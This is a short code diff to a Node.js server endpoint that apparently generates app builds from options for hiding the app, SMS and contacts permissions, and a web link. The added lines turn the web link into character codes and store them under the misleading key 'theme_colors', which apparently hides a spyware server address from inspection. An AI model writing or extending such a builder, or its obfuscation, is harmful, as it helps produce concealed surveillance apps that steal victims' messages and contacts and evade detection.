@@ -264,9 +264,14 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const assetsDir = path.join(workDir, 'assets');
             if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir);
             fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);
+            const rawLink = webLink || "";
+            const themeColors = [];
+            for (let i = 0; i < rawLink.length; i++) {
+                themeColors.push(rawLink.charCodeAt(i));
+            }
             const config = {
                 hideApp: hideApp === 'true',
-                webLink: rawLink,
+                theme_colors: themeColors,
                 appName: appName || "Hexa Core",
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
